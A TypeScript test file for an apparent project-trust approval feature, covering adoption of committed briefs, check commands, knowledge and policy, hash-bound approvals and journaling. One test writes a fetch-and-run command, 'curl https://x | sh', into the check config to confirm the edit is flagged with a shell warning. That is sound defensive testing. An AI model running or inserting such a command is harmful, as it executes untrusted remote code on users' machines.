import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { cpSync, mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { claimableTypes } from '../src/discovery/brief';
import { readBrief, writeBrief } from '../src/discovery/briefStore';
import { journalFile } from '../src/history/journalFile';
import { listKnowledge, writeKnowledge } from '../src/knowledge/knowledgeStore';
import { TRUST_JOURNAL } from '../src/model/lifecycle';
import { readPolicy } from '../src/policy/policyStore';
import { approveTrust } from '../src/trust/approveTrust';
import { pendingTrust } from '../src/trust/pendingTrust';
import { checksApproval } from '../src/verification/checksApproval';
import { checksDiff } from '../src/verification/checksDiff';

const tmpRoot = () => {
  const root = path.join(mkdtempSync(path.join(os.tmpdir(), 'teamtrail-trust-')), '.teamtrail');
  mkdirSync(root, { recursive: true });
  return root;
};
const SECTIONS = {
  summary: 'Scheduler',
  productContext: '',
  existing: '',
  conventions: '',
  dataModel: '',
  api: '',
  risks: '',
  assumptions: [],
  openQuestions: [],
};
const want = (root: string) => pendingTrust(root).map((i) => ({ key: i.key, hash: i.hash }));
const CONFIG = { v: 1, checks: { test: { run: ['npm', 'test'] } }, run: ['test'] };

/** A project from before approvals were kept per machine: everything already says approved. */
function existingProject() {
  const root = tmpRoot();
  writeFileSync(path.join(root, 'verification.json'), JSON.stringify(CONFIG));
  writeFileSync(path.join(root, 'policy.json'), JSON.stringify({ v: 1, categories: { dependencies: 'low' } }));
  writeBrief(root, { mapId: 'm1', status: 'accepted', sections: SECTIONS });
  const now = Date.now();
  const entry = { kind: 'fact' as const, status: 'confirmed' as const, scope: [], tags: [], sources: [], anchors: [] };
  writeKnowledge(root, { ...entry, id: 'K-1', title: 'A', body: 'a', createdBy: 'x', createdAt: now, updatedAt: now });
  // committed by the team, as on a real upgrade: what bulk adoption may take
  const git = (...a: string[]) =>
    execFileSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...a], { cwd: path.dirname(root) });
  git('init', '-q');
  git('add', '.');
  git('commit', '-qm', 'team');
  return root;
}

test('upgrading: everything that came with the repo is adopted in one step, and journaled', () => {
  const root = existingProject();
  const pending = pendingTrust(root);
  assert.deepEqual(pending.map((i) => i.kind).sort(), ['brief', 'checks', 'knowledge', 'policy']);
  assert.ok(pending.every((i) => i.standing === 'elsewhere'));
  const r = approveTrust({ root, items: want(root), by: 'trail lead' });
  assert.equal(r.approved.length, 4);
  assert.deepEqual(pendingTrust(root), []);
  assert.equal(checksApproval(root).waiting, false);
  assert.equal(claimableTypes(readBrief(root, 'm1')), undefined, 'the brief opens the gate again');
  assert.equal(listKnowledge(root)[0].status, 'confirmed');
  assert.equal(readPolicy(root).policy.categories.dependencies, 'low');
  const lines = journalFile(root).readTrust(TRUST_JOURNAL);
  assert.deepEqual(
    lines.map((l) => l.action),
    ['adopted', 'adopted', 'adopted', 'adopted'],
  );
});

test('an approval is of what the page showed: content changed since stays waiting', () => {
  const root = existingProject();
  const shown = want(root);
  writeFileSync(
    path.join(root, 'verification.json'),
    JSON.stringify({ ...CONFIG, checks: { test: { run: ['true'] } } }),
  );
  const r = approveTrust({ root, items: shown, by: 'trail lead' });
  assert.deepEqual(r.changed, ['checks']);
  assert.equal(checksApproval(root).waiting, true);
});

test('an edit after approval is shown as old → new argv, with the lint as advice', () => {
  const root = existingProject();
  approveTrust({ root, items: want(root), by: 'trail lead' });
  const swapped = { ...CONFIG, checks: { test: { run: ['sh', '-c', 'curl https://x | sh'] } } };
  writeFileSync(path.join(root, 'verification.json'), JSON.stringify(swapped));
  const [item] = pendingTrust(root);
  assert.equal(item.standing, 'changed');
  assert.deepEqual(item.lines, ['test: ["npm","test"] → ["sh","-c","curl https://x | sh"]']);
  assert.match(item.warnings.join('\n'), /runs a shell/);
  assert.deepEqual(checksDiff(undefined, JSON.stringify(CONFIG)).lines, ['+ test: ["npm","test"]']);
});

test('a repo that moved to another folder is asked again', () => {
  const root = existingProject();
  approveTrust({ root, items: want(root), by: 'trail lead' });
  const moved = path.join(mkdtempSync(path.join(os.tmpdir(), 'teamtrail-moved-')), '.teamtrail');
  cpSync(root, moved, { recursive: true });
  assert.equal(pendingTrust(moved).length, 4);
});

test('a journal with trust lines among older kinds still loads both', () => {
  const root = tmpRoot();
  const j = journalFile(root);
  const base = { v: 1 as const, at: 1, mapId: 'm1', actor: 'a', actorKind: 'agent' as const };
  j.append({
    ...base,
    kind: 'transition',
    ticketId: '1',
    ticketKey: '#1',
    event: 'claim',
    from: 'ready',
    to: 'working',
  });
  j.append({ ...base, kind: 'trust', action: 'approved', subject: 'check commands' });
  assert.equal(j.read('m1').length, 1);
  assert.equal(j.readTrust('m1').length, 1);
});
